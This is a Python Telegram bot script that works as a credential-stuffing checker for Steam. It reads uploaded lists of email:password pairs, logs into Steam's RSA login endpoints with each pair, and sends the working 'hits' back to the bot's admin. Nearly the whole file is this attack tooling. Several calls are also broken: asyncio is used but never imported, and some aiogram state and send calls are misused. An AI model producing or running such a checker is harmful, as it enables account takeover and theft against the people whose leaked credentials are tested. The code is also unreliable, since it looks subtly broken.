#!/usr/bin/env python3
import os
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import requests
from pathlib import Path
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
from urllib.parse import quote_plus
import re
import time

logging.basicConfig(level=logging.INFO)

TOKEN = os.getenv('BOT_TOKEN')
ADMIN = int(os.getenv('ADMIN_ID'))

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class Checker(StatesGroup):
    file = State()

def steam_check(email, password):
    try:
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # RSA
        r = s.post('https://steamcommunity.com/login/getrsakey/', 
                  data={'username': email.split('@')[0]})
        data = r.json()
        
        if not data['success']:
            return None
        
        n = int(data['publickey_mod'], 16)
        e = int(data['publickey_exp'], 16)
        key = RSA.construct((n, e))
        cipher = PKCS1_v1_5.new(key)
        enc_pass = base64.b64encode(cipher.encrypt(password.encode())).decode()
        
        # Login
        payload = {
            'donotcache': str(int(time.time())),
            'password': quote_plus(enc_pass),
            'username': email.split('@')[0],
            'rsatimestamp': data['timestamp'],
            'remember_login': 'false'
        }
        
        r = s.post('https://steamcommunity.com/login/dologin/', data=payload)
        result = r.json()
        
        if result.get('success', False):
            return f"{email}:{password}"
    except:
        pass
    return None

@dp.message(Command('start'))
async def start(msg: types.Message):
    if msg.from_user.id != ADMIN:
        return
    await msg.reply('Send combos.txt')
    await Checker.file.set()

@dp.message(F.document, Checker.file)
async def check_file(msg: types.Message):
    if msg.from_user.id != ADMIN:
        return
    
    file_info = await bot.get_file(msg.document.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    
    combos = []
    with open('input.txt', 'wb') as f:
        f.write(downloaded_file.read())
    
    with open('input.txt', 'r') as f:
        for line in f:
            combo = line.strip()
            if ':' in combo:
                combos.append(combo)
    
    hits = []
    status = await msg.reply(f'Starting {len(combos)} checks...')
    
    for i, combo in enumerate(combos):
        hit = steam_check(*combo.split(':', 1))
        if hit:
            hits.append(hit)
        
        await status.edit_text(f'{i+1}/{len(combos)} | Hits: {len(hits)}')
    
    if hits:
        Path('hits.txt').write_text('\n'.join(hits))
        await bot.send_document(ADMIN, data=FSInputFile('hits.txt'))
    
    await status.edit_text(f'Done! {len(hits)} hits')
    await Checker.file.set_state(msg.chat.id, False)

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
